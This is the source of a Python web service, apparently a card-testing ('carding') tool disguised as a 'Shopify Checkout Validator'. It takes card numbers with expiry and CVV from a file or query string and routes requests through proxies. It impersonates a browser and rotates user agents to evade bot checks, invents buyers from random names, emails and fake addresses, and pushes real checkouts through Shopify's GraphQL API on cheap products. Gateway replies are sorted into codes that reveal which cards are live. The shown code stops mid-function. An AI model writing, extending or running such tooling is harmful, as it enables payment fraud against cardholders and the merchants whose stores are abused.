"""
Shopify Checkout Validator API — VPS Edition
High-performance, fully async, production-ready.

Endpoints:
  GET /shopify?site={site}&cc={card}&proxy={proxy}
  GET /check?site={site}&card={card}&proxy={proxy}
  GET /health

Card formats:  cc|mm|yy|cvv  or  cc|mm|yyyy|cvv
Proxy formats: ip:port  |  ip:port:user:pass  |  host:port:user:pass  |  scheme://...

Environment variables (all optional):
  PORT              Server port (default 8080)
  WORKERS           uvicorn worker count (default 4)
  CARDS_FILE        Path to cards.txt (default ./cards.txt)
  MAX_PRICE         Max product price to target (default 8.0)
  SITE_CONCURRENCY  Max simultaneous requests per store (default 15)
  POOL_SIZE         aiohttp global connection pool (default 500)
  POOL_PER_HOST     aiohttp per-host connection limit (default 25)
  CONNECT_TIMEOUT   TCP connect timeout seconds (default 8)
  REQUEST_TIMEOUT   Full request timeout seconds (default 35)
  CACHE_TTL         Product cache TTL seconds (default 300)
  LOG_LEVEL         Logging level: debug|info|warning (default warning)
"""

import asyncio
import copy

import logging
import os
import random
import re
import time
from collections import defaultdict
from contextlib import asynccontextmanager
from typing import Any, Optional
from urllib.parse import urlparse

from curl_cffi.requests import AsyncSession, RequestsError
import orjson
import uvicorn
from fastapi import FastAPI, Query, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse

# ---------------------------------------------------------------------------
# Configuration from environment
# ---------------------------------------------------------------------------
PORT             = int(os.environ.get("PORT", 8080))
WORKERS          = int(os.environ.get("WORKERS", 1))
CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
MAX_PRICE        = float(os.environ.get("MAX_PRICE", 500.0))
SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 15))
POOL_SIZE        = int(os.environ.get("POOL_SIZE", 500))
POOL_PER_HOST    = int(os.environ.get("POOL_PER_HOST", 25))
CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 8))
REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 35))
CACHE_TTL        = float(os.environ.get("CACHE_TTL", 300))
LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()
LOG_FILE         = os.environ.get("LOG_FILE", "requests.txt")

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.WARNING),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("shopify")

app = FastAPI(
    title="Shopify Validator API",
    version="3.1",
    description="High-performance Shopify Checkout & Gateway Validator"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---------------------------------------------------------------------------
# Request / Response file logger  (incoming + all outgoing HTTP calls)
# ---------------------------------------------------------------------------
import aiofiles
import datetime

_log_lock = asyncio.Lock()
_SEP      = "=" * 70


async def _write_log(entry: str) -> None:
    """Non-blocking append to LOG_FILE."""
    async with _log_lock:
        try:
            async with aiofiles.open(LOG_FILE, mode="a", encoding="utf-8") as f:
                await f.write(entry)
        except Exception as ex:
            log.warning("Failed to write request log: %s", ex)


def _truncate(text: str, limit: int = 3000) -> str:
    if len(text) > limit:
        return text[:limit] + f"\n... [truncated {len(text) - limit} chars]"
    return text


async def _log_incoming(request: "Request", response_body: bytes,
                        status_code: int, elapsed_ms: float) -> None:
    """Log an incoming API request + its response to requests.txt."""
    now    = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    method = request.method
    url    = str(request.url)
    path   = request.url.path
    params = dict(request.query_params)
    client = request.client.host if request.client else "unknown"

    try:
        body_str = response_body.decode("utf-8", errors="replace")
    except Exception:
        body_str = "<binary>"

    entry = (
        f"\n{_SEP}\n"
        f"[{now}]  INCOMING  {method} {url}\n"
        f"Client   : {client}\n"
        f"Path     : {path}\n"
        f"Params   : {params}\n"
        f"Status   : {status_code}\n"
        f"Time     : {elapsed_ms:.1f}ms\n"
        f"Response :\n{_truncate(body_str)}\n"
        f"{_SEP}\n"
    )
    asyncio.create_task(_write_log(entry))


async def _log_outgoing(method: str, url: str, req_body,
                        status_code: int, resp_text: str,
                        elapsed_ms: float, label: str = "") -> None:
    """Log an outgoing HTTP call made internally by the API."""
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Sanitize request body
    try:
        if isinstance(req_body, bytes):
            rb = req_body.decode("utf-8", errors="replace")
        elif req_body is None:
            rb = ""
        else:
            rb = str(req_body)
    except Exception:
        rb = "<unreadable>"

    entry = (
        f"\n{_SEP}\n"
        f"[{now}]  OUTGOING  {method} {url}"
        + (f"  [{label}]" if label else "") + "\n"
        f"Status   : {status_code}\n"
        f"Time     : {elapsed_ms:.1f}ms\n"
        f"Req Body :\n{_truncate(rb, 1500)}\n"
        f"Response :\n{_truncate(resp_text, 3000)}\n"
        f"{_SEP}\n"
    )
    asyncio.create_task(_write_log(entry))


# ---------------------------------------------------------------------------
# LoggedSession — wraps AsyncSession and logs every request
# ---------------------------------------------------------------------------
class LoggedSession:
    """
    Thin wrapper around curl_cffi AsyncSession that logs every
    HTTP request and its response to requests.txt.
    """

    def __init__(self, session: "AsyncSession"):
        self._s = session

    async def _call(self, method: str, url: str, label: str = "",
                    data=None, json=None, **kwargs):
        t0 = time.time()
        # Build the body we'll log (before sending, in case of error)
        req_body = data if data is not None else (
            orjson.dumps(json) if json is not None else None
        )
        try:
            if json is not None:
                resp = await getattr(self._s, method.lower())(url, json=json, **kwargs)
            elif data is not None:
                resp = await getattr(self._s, method.lower())(url, data=data, **kwargs)
            else:
                resp = await getattr(self._s, method.lower())(url, **kwargs)

            elapsed = (time.time() - t0) * 1000
            try:
                resp_text = resp.text
            except Exception:
                resp_text = "<unreadable>"

            asyncio.create_task(
                _log_outgoing(method.upper(), url, req_body,
                              resp.status_code, resp_text, elapsed, label)
            )
            return resp

        except Exception as exc:
            elapsed = (time.time() - t0) * 1000
            asyncio.create_task(
                _log_outgoing(method.upper(), url, req_body,
                              0, f"EXCEPTION: {type(exc).__name__}: {exc}",
                              elapsed, label)
            )
            raise

    async def get(self, url: str, label: str = "", **kwargs):
        return await self._call("GET", url, label=label, **kwargs)

    async def post(self, url: str, label: str = "", data=None, json=None, **kwargs):
        return await self._call("POST", url, label=label, data=data, json=json, **kwargs)

    # Proxy anything else directly to the underlying session
    def __getattr__(self, name):
        return getattr(self._s, name)


# ---------------------------------------------------------------------------
# GraphQL Queries
# ---------------------------------------------------------------------------
# Variable declarations shared by both proposal queries
_PROPOSAL_VARS = (
    "$sessionInput:SessionTokenInput!,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$checkpointData:String,$queueToken:String,"
    "$reduction:ReductionInput,"
    "$availableRedeemables:AvailableRedeemablesInput,"
    "$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,"
    "$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,"
    "$captcha:CaptchaInput,$poNumber:String,"
    "$saleAttributions:SaleAttributionsInput,"
    "$alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$deliveryExpectations:DeliveryExpectationTermsInput,"
    "$memberships:MembershipsInput,"
    "$cartMetafields:[CartMetafieldOperationInput!]"
)

# PurchaseProposal arguments shared by both proposal queries
_PROPOSAL_ARGS = (
    "delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
    "reduction:$reduction,availableRedeemables:$availableRedeemables,"
    "tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,"
    "captcha:$captcha,saleAttributions:$saleAttributions,"
    "alternativePaymentCurrency:$alternativePaymentCurrency,"
    "deliveryExpectations:$deliveryExpectations,"
    "memberships:$memberships,"
    "cartMetafields:$cartMetafields"
)

# SellerProposal fragment (shared by shipping & delivery queries)
_SELLER_PROPOSAL_FIELDS = (
    "sellerProposal{"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "total{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "delivery{__typename "
    "...on FilledDeliveryTerms{deliveryLines{"
    "availableDeliveryStrategies{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "estimatedTimeInTransit{...on IntValueConstraint{value}}}}"
    "selectedDeliveryStrategy{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}"
    "tax{__typename "
    "...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}}"
    "payment{__typename "
    "...on FilledPaymentTerms{availablePaymentLines{"
    "paymentMethod{__typename "
    "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}"
    "__typename}"
)

QUERY_PROPOSAL_SHIPPING = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
)

# Receipt fragment shared by delivery proposal and submit mutation
_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on PaymentFailed{code messageUntranslated __typename}"
    "__typename}__typename}__typename}"
)

QUERY_PROPOSAL_DELIVERY = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
    + _RECEIPT_FRAGMENT
)

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion("
    "$input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],"
    "$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput)"
    "{submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields "
    "postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{"
    "errors{code localizedMessage nonLocalizedMessage __typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}__typename}"
    "...on TooManyRequests{__typename}"
    "...on TooManyAttempts{__typename}"
    "__typename}}"
    + _RECEIPT_FRAGMENT
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!)"
    "{receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken})"
    "{...ReceiptDetails __typename}}"
    + _RECEIPT_FRAGMENT
)

# ---------------------------------------------------------------------------
# Static data
# ---------------------------------------------------------------------------
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "ZAR": "ZA", "BRL": "BR",
    "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "JPY": "JP", "KRW": "KR",
}

ADDRESS_BOOK: dict[str, dict] = {
    "US": {"address1": "123 Main St",       "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
    "CA": {"address1": "88 Queen St W",     "city": "Toronto",     "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London",      "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road",      "city": "Mumbai",      "postalCode": "400001",  "zoneCode": "MH",  "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Khalifa Tower","city": "Dubai",       "postalCode": "00000",   "zoneCode": "DU",  "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "88 Nathan Road",    "city": "Kowloon",     "postalCode": "000000",  "zoneCode": "KLN", "countryCode": "HK", "phone": "55555555"},
    "CH": {"address1": "Gotthardstrasse 17","city": "Schwyz",      "postalCode": "6430",    "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place",    "city": "Sydney",      "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Unter den Linden 1","city": "Berlin",      "postalCode": "10117",   "zoneCode": "BE",  "countryCode": "DE", "phone": "3012345678"},
    "FR": {"address1": "1 Rue de Rivoli",   "city": "Paris",       "postalCode": "75001",   "zoneCode": "IDF", "countryCode": "FR", "phone": "142123456"},
    "NZ": {"address1": "1 Queen Street",    "city": "Auckland",    "postalCode": "1010",    "zoneCode": "AUK", "countryCode": "NZ", "phone": "98765432"},
    "SG": {"address1": "1 Raffles Place",   "city": "Singapore",   "postalCode": "048616",  "zoneCode": "01",  "countryCode": "SG", "phone": "61234567"},
    "JP": {"address1": "1-1 Marunouchi",    "city": "Tokyo",       "postalCode": "100-0005","zoneCode": "13",  "countryCode": "JP", "phone": "312345678"},
    "BR": {"address1": "Av. Paulista 1000", "city": "Sao Paulo",   "postalCode": "01310-100","zoneCode": "SP", "countryCode": "BR", "phone": "1112345678"},
    "MX": {"address1": "Paseo de la Reforma 1","city": "Mexico City","postalCode": "06600", "zoneCode": "CMX","countryCode": "MX", "phone": "5512345678"},
    "SE": {"address1": "Drottninggatan 1",  "city": "Stockholm",   "postalCode": "11151",   "zoneCode": "AB",  "countryCode": "SE", "phone": "812345678"},
    "DEFAULT": {"address1": "123 Main St",  "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
}

FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas",
               "Mary","Patricia","Jennifer","Linda","Barbara","Susan","Jessica","Sarah","Karen",
               "Emily","Ashley","Daniel","Matthew","Andrew","Joshua","Christopher","Ryan","Tyler"]
LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez",
               "Martinez","Hernandez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Lee",
               "White","Harris","Martin","Thompson","Turner","Mitchell","Campbell","Roberts","Evans"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com",
                 "live.com","mail.com","aol.com"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
]

# ---------------------------------------------------------------------------
# Global process-level state
# ---------------------------------------------------------------------------
_shared_session: Optional[LoggedSession] = None
_site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
    lambda: asyncio.Semaphore(SITE_CONCURRENCY)
)

# Product cache: hostname -> {"product": dict|None, "candidates": list, "err": str, "ts": float}
_product_cache: dict[str, dict] = {}

# Cards loaded from file
_cards_cache: list[dict] = []
_cards_loaded_at: float  = 0.0


# ---------------------------------------------------------------------------
# App lifecycle
# ---------------------------------------------------------------------------
@asynccontextmanager
async def lifespan(app: FastAPI):
    global _shared_session
    _shared_session = LoggedSession(AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT))
    _reload_cards()
    log.warning("Shopify Validator API started pool=%d/host concurrency=%d/site", POOL_SIZE, SITE_CONCURRENCY)
    yield
    if _shared_session:
        res = _shared_session.close()
        if asyncio.iscoroutine(res):
            await res


app = FastAPI(title="Shopify Validator", version="3.1.0", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Request statistics
_stats: dict[str, int] = defaultdict(int)


# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

def _reload_cards() -> None:
    global _cards_cache, _cards_loaded_at
    _cards_cache  = _load_cards_from_file()
    _cards_loaded_at = time.time()


def _load_cards_from_file() -> list[dict]:
    cards = []
    if not os.path.exists(CARDS_FILE):
        return cards
    with open(CARDS_FILE, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            card = _parse_card(line.strip())
            if card:
                cards.append(card)
    return cards


def _get_cards() -> list[dict]:
    global _cards_cache, _cards_loaded_at
    if not _cards_cache or (time.time() - _cards_loaded_at) > 120:
        _reload_cards()
    return _cards_cache


def _parse_card(raw: str) -> Optional[dict]:
    """Accept cc|mm|yy|cvv and cc|mm|yyyy|cvv.  Returns normalized dict or None."""
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    parts = raw.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc_num, mon, yr, cvv = [p.strip() for p in parts]
    if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
        return None
    if len(yr) == 4:
        yr = yr[2:]
    if len(yr) != 2:
        return None
    if not 1 <= int(mon) <= 12:
        return None
    if len(cc_num) < 13 or len(cc_num) > 19:
        return None
    return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}


def _parse_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    s = raw.strip()
    if "://" in s:
        return s
    parts = s.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None


def _pick_address(url: str, currency: Optional[str] = None) -> dict:
    netloc = urlparse(url).netloc.split(":")[0]
    tld    = netloc.split(".")[-1].upper()
    if tld in ADDRESS_BOOK:
        return ADDRESS_BOOK[tld]
    if currency:
        cc = C2C.get(currency.upper())
        if cc and cc in ADDRESS_BOOK:
            return ADDRESS_BOOK[cc]
    return ADDRESS_BOOK["DEFAULT"]


def _random_identity() -> tuple[str, str, str]:
    first = random.choice(FIRST_NAMES)
    last  = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email


def _extract(text: str, start: str, end: str) -> Optional[str]:
    """Fast substring extraction between two delimiters."""
    idx = text.find(start)
    if idx == -1:
        return None
    sub     = text[idx + len(start):]
    end_idx = sub.find(end)
    if end_idx == -1:
        return None
    val = sub[:end_idx]
    return val if val else None


def _extract_sst(text: str, headers: dict) -> Optional[str]:
    """Try every known pattern to pull the Shopify checkout session token."""
    # From response header (fastest)
    for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
        if key in headers:
            return headers[key]
    # From HTML / JSON embedded in page
    patterns = [
        ('name="serialized-sessionToken" content="&quot;', "&quot;"),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"',   '"'),
        ('"sessionToken":"',             '"'),
        ("sessionToken&quot;:&quot;",   "&quot;"),
        ('data-session-token="',         '"'),
        ('"checkout_session_token":"',   '"'),
    ]
    for s, e in patterns:
        val = _extract(text, s, e)
        if val and len(val) > 10:
            return val
    return None


def _normalize_response(raw: Optional[str]) -> str:
    """Map raw Shopify / aiohttp error text to a standard code."""
    if not raw:
        return "CARD_DECLINED"
    msg = str(raw).upper()

    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED")):
        return "ORDER_PLACED"
    if any(k in msg for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP",
                               "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
                               "AUTHENTICATION_REQUIRED", "THREEDSSECURE",
                               "THREE_D_SECURE", "3D_SECURE", "SCA_REQUIRED")):
        return "3DS_REQUIRED"
    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE",
                               "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
                               "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
        return "INVALID_CVC"
    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "DO_NOT_HONOR",
                               "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
        return "INSUFFICIENT_FUNDS"
    if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION")):
        return "EXPIRED_CARD"
    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
                               "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
                               "CARD_NOT_SUPPORTED")):
        return "INVALID_CARD"
    if any(k in msg for k in ("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
                               "NOT_PERMITTED", "SERVICE_NOT_ALLOWED",
                               "TRY_AGAIN_LATER", "LIMIT_EXCEEDED")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
        return "CAPTCHA_REQUIRED"
    return "CARD_DECLINED"


def _parse_gql_errors(errors: list) -> str:
    """
    Try to extract a meaningful response code from a GraphQL errors list.
    Conservative: only returns a specific code for very clear matches.
    Returns 'GRAPHQL_ERROR' for anything ambiguous so callers can retry.
    """
    for err in errors:
        for field in ("code", "nonLocalizedMessage", "localizedMessage",
                      "message", "localizedMessageHtml", "messageUntranslated"):
            raw = str(err.get(field) or "")
            if not raw:
                continue
            norm = _normalize_response(raw)
            if norm != "CARD_DECLINED":
                return norm
            upper = raw.upper()
            if any(k in upper for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
                return "CAPTCHA_REQUIRED"
            if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "EXCEEDS_BALANCE")):
                return "INSUFFICIENT_FUNDS"
            if any(k in upper for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "CVV_FAILURE", "INCORRECT_CVC")):
                return "INVALID_CVC"
            if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
                                         "CHARGE_DECLINED", "CARD_WAS_DECLINED",
                                         "FRAUD")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("CHECKOUT_ALREADY_COMPLETED", "ALREADY_ACCEPTED")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("SESSION_EXPIRED", "SESSION_INVALID",
                                         "TOKEN_EXPIRED", "INVALID_SESSION")):
                return "SESSION_EXPIRED"
            if any(k in upper for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED",
                                         "CUSTOMER_DISABLED")):
                return "SITE_REQUIRES_LOGIN"
            if any(k in upper for k in ("OUT_OF_STOCK", "SOLD_OUT",
                                         "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
                return "NO_PRODUCT"
            if any(k in upper for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS",
                                         "RATE_LIMITED", "RETRY_LATER")):
                return "THROTTLED"
    return "GRAPHQL_ERROR"


def _make_session(proxy_str: Optional[str]) -> tuple[LoggedSession, bool]:
    proxy = _parse_proxy(proxy_str) if proxy_str else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    session = LoggedSession(AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT, proxies=proxies))
    return session, True


# ---------------------------------------------------------------------------
# Product fetching with TTL cache
# ---------------------------------------------------------------------------
async def _fetch_products(
    base_url: str,
    proxy_str: Optional[str] = None,
    max_price: float = MAX_PRICE,
) -> tuple[Optional[dict], list[dict], Optional[str]]:
    """
    Returns (best_product, all_candidates_under_max_price, error_string).
    Results are cached per hostname for CACHE_TTL seconds.
    """
    if not base_url.startswith("http"):
        base_url = "https://" + base_url

    hostname = urlparse(base_url).netloc
    now      = time.time()

    cached = _product_cache.get(hostname)
    if cached and (now - cached["ts"]) < CACHE_TTL:
        return cached.get("product"), cached.get("candidates", []), cached.get("err")

    session, owned = _make_session(proxy_str)

    try:
        all_variants: list[dict] = []
        urls_to_try = [
            f"{base_url}/products.json?limit=250&sort_by=price-ascending",
            f"{base_url}/products.json?limit=250",
        ]
        for url in urls_to_try:
            try:
                resp = await session.get(url, allow_redirects=True)
                if resp.status_code == 200:
                    data     = orjson.loads(resp.content)
                    products = data.get("products", [])
                    if products:
                        all_variants = products
                        break
                elif resp.status_code in (429, 430):
                    err = "THROTTLED"
                    _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": now}
                    return None, [], err
            except Exception:
                continue

        candidates: list[dict] = []
        best: Optional[dict]   = None
        best_price             = float("inf")

        if not all_variants:
            # Fallback for headless Shopify (e.g. Gymshark) where products.json is unavailable
            try:
                import xml.etree.ElementTree as ET
                import re
                sitemap_url = f"{base_url}/sitemap_products_1.xml"
                smap_resp = await session.get(sitemap_url, allow_redirects=True)
                if smap_resp.status_code == 200:
                    root = ET.fromstring(smap_resp.content)
                    urls = []
                    for child in root:
                        if child.tag.endswith('url'):
                            for loc in child:
                                if loc.tag.endswith('loc'):
                                    urls.append(loc.text)

                    if urls:
                        sample_urls = random.sample(urls, min(25, len(urls)))
                        for purl in sample_urls:
                            try:
                                p_resp = await session.get(purl, allow_redirects=True)
                                matches = re.finditer(r'"id":(\d+).*?"inStock":true.*?,"price":([\d.]+)', p_resp.text)
                                for m in matches:
                                    variant_id = m.group(1)
                                    price = float(m.group(2))
                                    if 0 < price <= max_price:
                                        entry = {
                                            "site":       base_url,
                                            "price":      f"{price:.2f}",
                                            "price_f":    price,
                                            "variant_id": str(variant_id),
                                            "title":      "Product",
                                            "handle":     "",
                                        }
                                        candidates.append(entry)
                                        if price < best_price:
                                            best_price = price
                                            best       = entry
                            except Exception:
                                pass
            except Exception:
                pass

            if not candidates:
                err = "No products found"
                _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": now}
                return None, [], err
        else:
            for product in all_variants:
                for variant in product.get("variants", []):
                    try:
                        avail = variant.get("available", True)
                        if avail is False:
                            continue
                        price = float(variant.get("price") or "0")
                    except (ValueError, TypeError):
                        continue
                    if price <= 0 or price > max_price:
                        continue
                    entry = {
                        "site":       base_url,
                        "price":      f"{price:.2f}",
                        "price_f":    price,
                        "variant_id": str(variant["id"]),
                        "title":      product.get("title", "Product"),
                        "handle":     product.get("handle", ""),
                    }
                    candidates.append(entry)
                    if price < best_price:
                        best_price = price
                        best       = entry

        if not best:
            err = f"No products under ${max_price:.2f}"
            _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": now}
            return None, [], err

        _product_cache[hostname] = {"product": best, "candidates": candidates, "err": None, "ts": now}
